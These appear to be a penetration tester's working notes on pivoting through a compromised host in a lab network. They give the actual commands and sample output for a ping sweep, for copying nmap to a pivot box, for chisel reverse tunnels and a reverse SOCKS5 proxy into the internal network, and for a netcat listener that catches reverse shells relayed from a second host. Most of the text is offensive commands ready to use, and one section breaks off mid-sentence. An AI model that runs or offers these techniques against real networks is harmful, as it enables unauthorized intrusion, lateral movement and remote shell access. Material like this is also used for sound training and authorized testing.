
#pingsweep
- Ping sweep for loop for network identification
```bash
for i in $(seq 254); do ping 192.168.146.${i} -c1 -W1 & done | grep from 

- where c1 = 1 connection
- where w1 = timeout
example:
64 bytes from 192.168.146.2: icmp_seq=1 ttl=128 time=0.351 ms
64 bytes from 192.168.146.129: icmp_seq=1 ttl=64 time=0.045 ms
64 bytes from 192.168.146.134: icmp_seq=1 ttl=128 time=1.78 ms

```

#binaries #scp
- Typically way faster than running nmap through a proxychains tunnel
- can just pull static binaries onto system and scan from the pivot box
```bash
scp nmap pivot@10.1.1.10:/tmp

- secure copying nmap from kali machine to the pivot IP and placing into /tmp
- if ssh is open, need to put in password
```

#chiselserver
- Ran on Kali machine
```bash
./chisel_64 server --socks5 -p 1080  --reverse
2023/10/12 21:21:21 server: SOCKS5 server enabled
2023/10/12 21:21:21 server: Reverse tunnelling enabled
2023/10/12 21:21:21 server: Fingerprint b1:31:90:f2:07:a4:96:70:6f:d5:69:db:34:bd:da:11
2023/10/12 21:21:21 server: Listening on 0.0.0.0:1080...

- keep note of the fingerprint that gets spit out after
where --reverse = the server reaching out to the client which is weird in nature
```

#chiselclient 
- Ran on T1 that has internal network access
```bash
./chisel client --fingerprint b1:31:90:f2:07:a4:96:70:6f:d5:69:db:34:bd:da:11 192.168.146.134:1080 R:8000:192.168.146.40:80


Where R: == Reverse Port Forward
Where 8000 == Reverse all traffic from next statement to port 8000 on the kali machine
Where 192.168.146.40:80 == Reversing all traffic from the web server to our kali localhost:8000. Dragging it back to our physical server
```

#socksproxy #chiselclient
- just another way to do it different than above.
- gives access to everything in internal environment
- instead of port forwarding from one ip to another, socks allows for complete view of internal network
```bash
./chisel client --fingerprint b1:31:90:f2:07:a4:96:70:6f:d5:69:db:34:bd:da:11 192.168.146.129:1080 R:socks5

where R:Socks5 == Reverse Port Forward from anything utilizing proxychains socks5
where  192.168.146.134:1080 == hitting port 1080 on kali localhost and getting reverse forwarded back through the socks proxy to kali machine
where 
```

#reverseshell #proxychains
- Setting up port forwarding to allow a reverse shell to come back through 
- from T2 -> T1 -> Kali machine.
- Setup on Pivot Box T1
```bash
./chisel client --fingerprint b1:31:90:f2:07:a4:96:70:6f:d5:69:db:34:bd:da:11 192.168.146.129:1080 0.0.0.0:9999:192.168.146.129:9999

where 192.168.146.129:1080 == chisel server ip address and port
where 0.0.0.0:9999 == T1 any ip address that is hitting port 9999
where 192.168.146.129:9999 == Will be redirected to the kali machine on port 9999

- to utilize this can setup a 
```

#listener
- netcat listener on port 9999 attacker machine to catch any reverse shell
```bash
[root💀/opt/chisel/archive] [192.168.146.129] [2023-10-12 21:53:37] 
 └─╼ # nc -lvnp 9999
listening on [any] 9999 ...

```